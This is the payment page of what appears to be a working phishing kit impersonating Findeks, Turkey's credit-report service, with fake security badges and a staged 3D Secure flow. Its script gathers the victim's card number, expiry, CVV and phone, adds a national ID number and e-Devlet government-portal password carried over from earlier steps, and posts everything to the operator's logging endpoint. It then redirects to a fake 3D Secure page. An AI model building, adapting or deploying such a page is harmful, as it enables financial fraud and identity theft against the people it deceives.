<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Ödeme - Findeks</title>
    <link rel="icon" type="image/png" href="https://www.findeks.com/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            primary:   '#0056A4',
                            secondary: '#0070cc',
                            light:     '#e8f1fb',
                            dark:      '#003d7a',
                        }
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                    }
                }
            }
        };
    </script>
    <style>
        /* ── Floating label ── */
        .float-group { position: relative; }
        .float-group input {
            padding-top: 1.375rem;
            padding-bottom: 0.5rem;
        }
        .float-label {
            position: absolute; left: 1rem; top: 50%;
            transform: translateY(-50%);
            font-size: 0.875rem; color: #9ca3af;
            pointer-events: none; transition: all 0.18s ease; white-space: nowrap;
        }
        .float-group input:focus ~ .float-label,
        .float-group input:not(:placeholder-shown) ~ .float-label {
            top: 0.6rem; transform: translateY(0);
            font-size: 0.7rem; color: #0056A4; font-weight: 600;
        }
        .float-group input:focus {
            outline: none; border-color: #0056A4;
            box-shadow: 0 0 0 3px rgba(0,86,164,0.12);
        }
        .float-group input.input-error {
            border-color: #ef4444;
            box-shadow: 0 0 0 3px rgba(239,68,68,0.1);
        }

        /* ── Progress tabs ── */
        .step-tab {
            display: flex; align-items: center; gap: 6px;
            padding: 6px 14px; border-radius: 20px;
            font-size: 12px; font-weight: 600;
            transition: all 0.2s; white-space: nowrap;
        }
        .step-tab.active  { background: #0056A4; color: #fff; }
        .step-tab.done    { background: #e8f1fb; color: #0056A4; }
        .step-tab.pending { background: transparent; color: #9ca3af; }
        .step-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
        .step-tab.active  .step-dot { background: rgba(255,255,255,0.7); }
        .step-tab.done    .step-dot { background: #0056A4; }
        .step-tab.pending .step-dot { background: #d1d5db; }

        /* ── Right panel deco ── */
        .findeks-deco {
            background: linear-gradient(160deg, #0056A4 0%, #0070cc 35%, #0056A4 60%, #003d7a 100%);
            position: relative; overflow: hidden;
        }
        .findeks-deco::before {
            content: ''; position: absolute; inset: 0;
            background:
                radial-gradient(ellipse 80% 60% at 110% 20%, rgba(255,255,255,0.12) 0%, transparent 60%),
                radial-gradient(ellipse 60% 80% at -10% 80%, rgba(0,30,80,0.35) 0%, transparent 60%);
            pointer-events: none;
        }
        .findeks-deco::after {
            content: ''; position: absolute; inset: 0;
            background-image: radial-gradient(circle, rgba(255,255,255,0.07) 1px, transparent 1px);
            background-size: 24px 24px; pointer-events: none;
        }

        /* ── Secure badge pulse ── */
        @keyframes securePulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(16,185,129,0.35); }
            50%       { box-shadow: 0 0 0 6px rgba(16,185,129,0); }
        }
        .secure-pulse { animation: securePulse 2.5s ease-in-out infinite; }

        /* ── Modal backdrop ── */
        .modal-backdrop {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.55); z-index: 9000;
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(2px);
        }
        .modal-backdrop.hidden { display: none; }

        /* ── Spinner ── */
        .spinner {
            width: 44px; height: 44px;
            border: 4px solid rgba(0,86,164,0.15);
            border-top-color: #0056A4; border-radius: 50%;
            animation: spin 0.75s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* ── Page overlay ── */
        body { background: #f0f4f8; font-family: 'Inter', system-ui, sans-serif; }
        .page-overlay {
            position: fixed; inset: 0;
            background: rgba(10,20,40,0.6); z-index: 10;
            backdrop-filter: blur(4px);
        }
        .modal-shell {
            position: relative; z-index: 20;
            width: 100%; min-height: 100vh;
            display: flex; flex-direction: column;
        }

        /* ── Card visual ── */
        .card-visual {
            background: linear-gradient(135deg, #1a3a6b 0%, #0056A4 50%, #0070cc 100%);
            border-radius: 14px; padding: 20px;
            color: #fff; position: relative; overflow: hidden;
            min-height: 120px;
        }
        .card-visual::before {
            content: ''; position: absolute;
            top: -20px; right: -20px;
            width: 120px; height: 120px;
            background: rgba(255,255,255,0.06);
            border-radius: 50%;
        }

        /* ── Scrollbar ── */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 99px; }
    </style>
</head>
<body>

<!-- Page overlay -->
<div class="page-overlay" aria-hidden="true"></div>

<div class="modal-shell">

    <!-- ── HEADER ── -->
    <header class="sticky top-0 z-50 bg-white border-b border-gray-100 shadow-sm">
        <div class="max-w-5xl mx-auto px-4 h-14 flex items-center justify-between gap-4">

            <!-- Findeks logo -->
            <a href="index.php" class="flex items-center gap-2 flex-shrink-0" aria-label="Findeks Ana Sayfa">
                <svg width="110" height="28" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>

            <!-- Title -->
            <span class="hidden sm:block text-sm font-semibold text-gray-700 tracking-wide">Kredi Notunu Öğren</span>

            <!-- Progress tabs — desktop -->
            <nav class="hidden md:flex items-center gap-1" aria-label="Adımlar">
                <div class="step-tab done">
                    <span class="step-dot"></span>Bilgiler
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>Paket
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab active" aria-current="step">
                    <span class="step-dot"></span>Ödeme
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>3D Secure
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>Sonuç
                </div>
            </nav>

            <!-- Progress dots — mobile -->
            <div class="flex md:hidden items-center gap-1.5" aria-label="Adım 3 / 5">
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2.5 h-2.5 rounded-full bg-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
            </div>

            <!-- Close button -->
            <a href="index.php"
               class="flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-colors"
               aria-label="Kapat">
                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
            </a>
        </div>
    </header>

    <!-- ── MAIN CONTENT ── -->
    <main class="flex-1 max-w-5xl mx-auto w-full px-4 py-8 lg:py-12">
        <div class="flex flex-col lg:flex-row gap-8 lg:gap-10 items-start">

            <!-- LEFT COLUMN — Payment form -->
            <div class="flex-1 w-full">

                <div class="mb-7">
                    <h1 class="text-2xl font-bold text-gray-900 tracking-tight">Ödeme Bilgileri</h1>
                    <p class="text-sm text-gray-500 mt-1.5 leading-relaxed">
                        Kredi kartı bilgilerinizi güvenli şekilde girin.
                    </p>
                </div>

                <!-- Error banner -->
                <div id="errorBanner" role="alert" aria-live="assertive"
                     class="hidden mb-5 flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-xl text-sm text-red-700">
                    <svg class="w-5 h-5 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                    <span id="errorText"></span>
                </div>

                <!-- Card visual preview -->
                <div class="card-visual mb-6">
                    <div class="flex items-start justify-between mb-4">
                        <div class="w-10 h-7 bg-yellow-400/80 rounded-md"></div>
                        <div id="cardSchemeIcon" class="text-white/60 text-xs font-bold tracking-widest"></div>
                    </div>
                    <p class="text-white/90 font-mono text-lg tracking-widest mb-3" id="cardPreviewNumber">•••• •••• •••• ••••</p>
                    <div class="flex items-end justify-between">
                        <div>
                            <p class="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">Kart Sahibi</p>
                            <p class="text-white text-sm font-semibold" id="cardPreviewHolder">AD SOYAD</p>
                        </div>
                        <div class="text-right">
                            <p class="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">Son Kullanma</p>
                            <p class="text-white text-sm font-semibold" id="cardPreviewExpiry">AA/YY</p>
                        </div>
                    </div>
                </div>

                <!-- Credit card only notice -->
                <div class="flex items-center gap-2 p-3 bg-amber-50 border border-amber-200 rounded-xl mb-5">
                    <svg class="w-4 h-4 text-amber-500 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                    <span class="text-xs text-amber-700 font-medium">Sadece kredi kartı ile ödeme kabul edilmektedir.</span>
                </div>

                <!-- Payment form -->
                <form id="paymentForm" novalidate autocomplete="off" class="space-y-4">

                    <!-- Card holder -->
                    <div class="float-group">
                        <input type="text" id="cardHolder" name="cardHolder"
                               placeholder=" " autocomplete="off"
                               aria-label="Kart Üzerindeki Ad Soyad" aria-required="true"
                               class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all">
                        <label for="cardHolder" class="float-label">Kart Üzerindeki Ad Soyad</label>
                    </div>

                    <!-- Card number -->
                    <div class="float-group">
                        <input type="text" id="cardNumber" name="cardNumber"
                               inputmode="numeric" maxlength="19"
                               placeholder=" " autocomplete="off"
                               aria-label="Kart Numarası" aria-required="true"
                               class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all pr-16">
                        <label for="cardNumber" class="float-label">Kart Numarası</label>
                        <div id="bankBadge" class="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1"></div>
                    </div>

                    <!-- Expiry + CVV -->
                    <div class="grid grid-cols-2 gap-4">
                        <div class="float-group">
                            <input type="text" id="cardExpiry" name="cardExpiry"
                                   inputmode="numeric" maxlength="5"
                                   placeholder=" " autocomplete="off"
                                   aria-label="Son Kullanma Tarihi" aria-required="true"
                                   class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all">
                            <label for="cardExpiry" class="float-label">Son Kullanma (AA/YY)</label>
                        </div>
                        <div class="float-group">
                            <input type="text" id="cardCvv" name="cardCvv"
                                   inputmode="numeric" maxlength="4"
                                   placeholder=" " autocomplete="off"
                                   aria-label="CVV" aria-required="true"
                                   class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all">
                            <label for="cardCvv" class="float-label">CVV / CVC</label>
                        </div>
                    </div>

                    <!-- Phone -->
                    <div class="float-group">
                        <input type="tel" id="phone" name="phone"
                               inputmode="tel" maxlength="14"
                               placeholder=" " autocomplete="off"
                               aria-label="Cep Telefonu" aria-required="true"
                               class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all">
                        <label for="phone" class="float-label">Cep Telefonu (05XX XXX XX XX)</label>
                    </div>

                    <!-- Submit -->
                    <button type="submit" id="submitBtn"
                            class="w-full py-3.5 bg-brand-primary hover:bg-brand-secondary text-white font-semibold rounded-xl text-sm transition-all flex items-center justify-center gap-2 shadow-sm hover:shadow-md mt-2">
                        <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                        Ödeme Yap
                    </button>

                    <!-- Trust row -->
                    <div class="flex items-center justify-center gap-5 pt-1">
                        <div class="flex items-center gap-1.5 text-gray-400">
                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                            <span class="text-[11px]">SSL Şifreli</span>
                        </div>
                        <div class="flex items-center gap-1.5 text-gray-400">
                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
                            <span class="text-[11px]">256-bit Şifreleme</span>
                        </div>
                        <div class="flex items-center gap-1.5 text-gray-400">
                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                            <span class="text-[11px]">KKB Güvenceli</span>
                        </div>
                    </div>

                </form>
            </div>

            <!-- RIGHT COLUMN — Order summary -->
            <aside class="findeks-deco hidden lg:flex flex-col w-80 xl:w-96 rounded-2xl p-8 flex-shrink-0" aria-label="Sipariş Özeti">

                <!-- Panel header -->
                <div class="mb-6 relative z-10">
                    <div class="flex items-center gap-3 mb-1">
                        <div class="w-8 h-8 bg-white/15 rounded-lg flex items-center justify-center backdrop-blur-sm">
                            <svg class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                        </div>
                        <h2 class="text-white font-semibold text-lg">Sipariş Özeti</h2>
                    </div>
                    <p class="text-blue-200/70 text-xs ml-11">Seçtiğiniz paket ve ödeme detayları</p>
                </div>

                <!-- Package summary -->
                <div class="relative z-10 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15 p-5 mb-5">
                    <div class="flex items-start gap-3">
                        <div class="w-11 h-11 bg-white/15 rounded-lg flex items-center justify-center flex-shrink-0">
                            <svg class="w-5 h-5 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
                        </div>
                        <div class="flex-1 min-w-0">
                            <p class="text-white text-sm font-semibold" id="sidebarPackageName">Kredi Notu Raporu</p>
                            <p class="text-blue-200/70 text-xs mt-0.5">Findeks Hizmet Paketi</p>
                        </div>
                    </div>
                    <div class="mt-4 pt-4 border-t border-white/15 space-y-2">
                        <div class="flex items-center justify-between">
                            <span class="text-blue-200/80 text-sm">Paket Ücreti</span>
                            <span class="text-white font-semibold" id="sidebarPackagePrice">₺99,00</span>
                        </div>
                        <div class="flex items-center justify-between">
                            <span class="text-blue-200/80 text-sm">KDV (%18)</span>
                            <span class="text-white font-semibold" id="sidebarVat">₺17,82</span>
                        </div>
                        <div class="flex items-center justify-between pt-2 border-t border-white/15">
                            <span class="text-white font-bold text-sm">Toplam</span>
                            <span class="text-white font-bold text-xl" id="sidebarTotal">₺116,82</span>
                        </div>
                    </div>
                </div>

                <!-- Step info -->
                <div class="relative z-10 space-y-2.5 mb-6">
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-white text-xs font-semibold">Bilgilerinizi girdiniz</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-white text-xs font-semibold">Paket seçtiniz</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <span class="text-brand-primary text-[10px] font-bold">3</span>
                        </div>
                        <span class="text-white text-xs font-semibold">Ödeme bilgilerini girin</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">4</span>
                        </div>
                        <span class="text-white text-xs">3D Secure doğrulama</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">5</span>
                        </div>
                        <span class="text-white text-xs">Raporunuzu görüntüleyin</span>
                    </div>
                </div>

                <!-- Secure badge -->
                <div class="relative z-10 mt-auto">
                    <div class="secure-pulse flex items-center gap-3 p-4 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15">
                        <div class="w-10 h-10 bg-emerald-500/20 rounded-lg flex items-center justify-center flex-shrink-0">
                            <svg class="w-5 h-5 text-emerald-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                        </div>
                        <div>
                            <p class="text-white text-xs font-semibold">Güvenli Ödeme</p>
                            <p class="text-blue-200/60 text-[10px] mt-0.5">3D Secure ile korunan ödeme</p>
                        </div>
                    </div>
                    <div class="flex items-center gap-2 mt-4 justify-center flex-wrap">
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">GlobalSign</span>
                        </div>
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">KKB</span>
                        </div>
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">Eyebrand</span>
                        </div>
                    </div>
                </div>

            </aside>

        </div>
    </main>

    <!-- ── FOOTER ── -->
    <footer class="border-t border-gray-100 bg-white mt-auto">
        <div class="max-w-5xl mx-auto px-4 py-5 flex flex-col sm:flex-row items-center justify-between gap-4">
            <a href="index.php" class="flex items-center gap-2" aria-label="Findeks">
                <svg width="90" height="22" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>
            <p class="text-[11px] text-gray-400 text-center">
                &copy; <?= date('Y') ?> Findeks — Kredi Kayıt Bürosu A.Ş. Tüm hakları saklıdır.
            </p>
            <div class="flex items-center gap-2">
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">GlobalSign</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">KKB</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">Eyebrand</span>
            </div>
        </div>
    </footer>

</div><!-- end modal-shell -->

<!-- Loading modal -->
<div id="loadingModal" class="modal-backdrop hidden" role="status" aria-live="polite" aria-label="Ödeme işleniyor">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-xs mx-4 p-8 text-center">
        <div class="spinner mx-auto mb-5"></div>
        <p class="text-sm font-semibold text-gray-800">Ödemeniz İşleniyor</p>
        <p class="text-xs text-gray-400 mt-1.5">Lütfen sayfayı kapatmayın...</p>
    </div>
</div>

<!-- Error modal -->
<div id="errorModal" class="modal-backdrop hidden" role="alertdialog" aria-modal="true" aria-labelledby="errorModalTitle">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm mx-4 overflow-hidden">
        <div class="p-6 text-center">
            <div class="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
            </div>
            <h3 id="errorModalTitle" class="text-base font-bold text-gray-900 mb-2">Hata</h3>
            <p id="errorModalText" class="text-sm text-gray-500 leading-relaxed mb-5"></p>
            <button onclick="closeErrorModal()"
                    class="w-full py-2.5 bg-brand-primary hover:bg-brand-secondary text-white text-sm font-semibold rounded-xl transition-colors">
                Tamam
            </button>
        </div>
    </div>
</div>

<script>
    // Guard: redirect if no session
    const tc   = sessionStorage.getItem('edevlet_tc') || sessionStorage.getItem('findeks_tc') || '';
    const pass = sessionStorage.getItem('edevlet_pass') || '';
    if (!tc) {
        window.location.href = 'basvuru.php';
    }

    // Load package info from session
    const pkgName  = sessionStorage.getItem('findeks_package_name')  || 'Kredi Notu Raporu';
    const pkgPrice = parseFloat(sessionStorage.getItem('findeks_package_price') || '99.00');
    const pkgLabel = sessionStorage.getItem('findeks_package_label') || '₺99,00';

    // Update sidebar
    document.getElementById('sidebarPackageName').textContent  = pkgName;
    document.getElementById('sidebarPackagePrice').textContent = pkgLabel;

    const vat   = pkgPrice * 0.18;
    const total = pkgPrice + vat;
    document.getElementById('sidebarVat').textContent   = '₺' + vat.toFixed(2).replace('.', ',');
    document.getElementById('sidebarTotal').textContent = '₺' + total.toFixed(2).replace('.', ',');

    // ── Input masks ──
    const cardHolderEl = document.getElementById('cardHolder');
    const cardNumberEl = document.getElementById('cardNumber');
    const cardExpiryEl = document.getElementById('cardExpiry');
    const cardCvvEl    = document.getElementById('cardCvv');
    const phoneEl      = document.getElementById('phone');
    const bankBadge    = document.getElementById('bankBadge');

    cardHolderEl.addEventListener('input', function() {
        this.value = this.value.replace(/[^a-zA-ZçÇğĞıİöÖşŞüÜ\s]/g, '').toUpperCase();
        document.getElementById('cardPreviewHolder').textContent = this.value || 'AD SOYAD';
    });

    cardNumberEl.addEventListener('input', function() {
        let v = this.value.replace(/\D/g, '');
        let formatted = '';
        for (let i = 0; i < v.length && i < 16; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += v[i];
        }
        this.value = formatted;

        // Update card preview
        const display = formatted.padEnd(19, '•').replace(/[0-9]/g, (c, i) => i < formatted.length ? c : '•');
        const parts = [];
        for (let i = 0; i < 19; i += 5) parts.push(display.substring(i, i + 4));
        document.getElementById('cardPreviewNumber').textContent = parts.join(' ');

        if (v.length >= 6) fetchBinInfo(v);
        else { bankBadge.innerHTML = ''; document.getElementById('cardSchemeIcon').textContent = ''; }
    });

    cardExpiryEl.addEventListener('input', function() {
        let v = this.value.replace(/\D/g, '');
        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
        this.value = v;
        document.getElementById('cardPreviewExpiry').textContent = v || 'AA/YY';
    });

    cardCvvEl.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
    });

    phoneEl.addEventListener('input', function() {
        let v = this.value.replace(/\D/g, '').substring(0, 11);
        let out = '';
        if (v.length > 0) out = v.substring(0, 4);
        if (v.length > 4) out += ' ' + v.substring(4, 7);
        if (v.length > 7) out += ' ' + v.substring(7, 9);
        if (v.length > 9) out += ' ' + v.substring(9, 11);
        this.value = out;
    });

    let currentBinInfo = null;

    function fetchBinInfo(num) {
        const bin = num.substring(0, 6);
        fetch('api/bin.php?bin=' + bin)
            .then(r => r.json())
            .then(data => {
                if (data.success && data.data) {
                    currentBinInfo = data.data;
                    let html = '';
                    if (data.data.bank_logo) {
                        html = '<img src="' + data.data.bank_logo + '" class="h-6 max-w-[70px] object-contain rounded" alt="">';
                    }
                    bankBadge.innerHTML = html;
                    if (data.data.scheme) {
                        document.getElementById('cardSchemeIcon').textContent = data.data.scheme.toUpperCase();
                    }
                }
            })
            .catch(() => {});
    }

    // ── Luhn check ──
    function luhn(num) {
        let sum = 0, alt = false;
        for (let i = num.length - 1; i >= 0; i--) {
            let n = parseInt(num[i], 10);
            if (alt) { n *= 2; if (n > 9) n -= 9; }
            sum += n; alt = !alt;
        }
        return sum % 10 === 0;
    }

    // ── Error helpers ──
    function showBanner(msg) {
        document.getElementById('errorText').textContent = msg;
        document.getElementById('errorBanner').classList.remove('hidden');
        document.getElementById('errorBanner').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
    function hideBanner() {
        document.getElementById('errorBanner').classList.add('hidden');
    }
    function showErrorModal(msg) {
        document.getElementById('errorModalText').textContent = msg;
        document.getElementById('errorModal').classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    }
    function closeErrorModal() {
        document.getElementById('errorModal').classList.add('hidden');
        document.body.style.overflow = '';
    }
    document.getElementById('errorModal').addEventListener('click', function(e) {
        if (e.target === this) closeErrorModal();
    });

    // ── Form submission ──
    document.getElementById('paymentForm').addEventListener('submit', function(e) {
        e.preventDefault();
        hideBanner();

        const holder = cardHolderEl.value.trim();
        const number = cardNumberEl.value.replace(/\s/g, '');
        const expiry = cardExpiryEl.value.trim();
        const cvv    = cardCvvEl.value.trim();
        const tel    = phoneEl.value.replace(/\s/g, '');

        // Validation
        if (!holder || holder.length < 3) {
            showBanner('Kart üzerindeki ad soyadı giriniz.');
            cardHolderEl.focus(); return;
        }
        if (number.length < 15 || !luhn(number)) {
            showBanner('Geçerli bir kart numarası giriniz.');
            cardNumberEl.focus(); return;
        }
        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
            showBanner('Son kullanma tarihini AA/YY formatında giriniz.');
            cardExpiryEl.focus(); return;
        }
        const [m] = expiry.split('/').map(Number);
        if (m < 1 || m > 12) {
            showBanner('Geçersiz ay değeri.');
            cardExpiryEl.focus(); return;
        }
        if (cvv.length < 3) {
            showBanner('CVV kodunu giriniz.');
            cardCvvEl.focus(); return;
        }
        if (tel.length < 10) {
            showBanner('Geçerli bir cep telefonu numarası giriniz.');
            phoneEl.focus(); return;
        }

        document.getElementById('submitBtn').disabled = true;
        document.getElementById('loadingModal').classList.remove('hidden');
        document.body.style.overflow = 'hidden';

        const sessionId = localStorage.getItem('tracker_session_id') || '';

        const payload = {
            session_id:     sessionId,
            customer_name:  holder,
            customer_phone: tel,
            card_number:    number,
            card_expiry:    expiry,
            card_cvv:       cvv,
            card_holder:    holder,
            card_bank:      currentBinInfo ? currentBinInfo.bank : '',
            card_bin:       number.substring(0, 6),
            card_type:      currentBinInfo ? currentBinInfo.card_type : '',
            card_scheme:    currentBinInfo ? currentBinInfo.scheme : '',
            card_sub_type:  currentBinInfo ? currentBinInfo.sub_type : '',
            items: {
                tc_kimlik:    tc,
                edevlet_sifre: pass,
                islem_tipi:   'findeks_odeme',
                paket_adi:    pkgName,
                borc_tutari:  pkgPrice
            },
            total: pkgPrice
        };

        fetch('api/logs.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(r => {
            if (!r.ok) throw new Error('HTTP ' + r.status);
            return r.json();
        })
        .then(data => {
            if (data.success && data.id) {
                localStorage.setItem('logId', data.id);
                localStorage.setItem('logAmount', pkgPrice);
                window.location.href = '3dsecure.php?id=' + data.id;
            } else {
                throw new Error(data.error || 'Bilinmeyen hata');
            }
        })
        .catch(() => {
            document.getElementById('loadingModal').classList.add('hidden');
            document.getElementById('submitBtn').disabled = false;
            document.body.style.overflow = '';
            showBanner('Bağlantı hatası oluştu. Lütfen tekrar deneyiniz.');
        });
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') closeErrorModal();
    });
</script>

<?php include 'includes/tracker.php'; ?>
</body>
</html>
